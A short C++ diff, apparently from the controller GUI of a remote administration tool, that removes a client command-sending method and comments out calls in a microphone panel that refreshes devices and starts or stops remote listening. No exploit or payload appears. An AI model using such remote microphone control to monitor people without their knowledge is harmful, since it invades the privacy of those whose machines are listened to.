@@ -100,10 +100,6 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
 
 }
 
-int FrameCliente::EnviarComando(std::string strComando, bool isBlock) {
-    return p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, isBlock);
-}
-
 void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
     int closedPage = event.GetSelection();
     wxString pageTitle = this->m_tree->p_Notebook->GetPageText(closedPage);
@@ -322,7 +318,7 @@ void panelMicrophone::OnRefrescarDispositivos(wxCommandEvent& event) {
     std::string strComando = std::to_string(EnumComandos::Mic_Refre_Dispositivos);
     strComando.append(1, '~');
     strComando.append(1, '0');
-    this->EnviarComando(strComando);
+    //this->EnviarComando(strComando);
 }
 
 void panelMicrophone::OnEscuchar(wxCommandEvent& event) {
@@ -335,13 +331,13 @@ void panelMicrophone::OnEscuchar(wxCommandEvent& event) {
     //Quien tiene mas de 10 microfonos :v ?
     strComando.append(1, str_device_id[1]);
 
-    this->EnviarComando(strComando);
+    //this->EnviarComando(strComando);
 }
 
 void panelMicrophone::OnDetener(wxCommandEvent& event) {
     std::string strComando = std::to_string(EnumComandos::Mic_Detener_Escucha);
     strComando.append(1, '~');
-    this->EnviarComando(strComando);
+    //this->EnviarComando(strComando);
 }
 
 void panelMicrophone::EnviarComando(std::string pComando) {
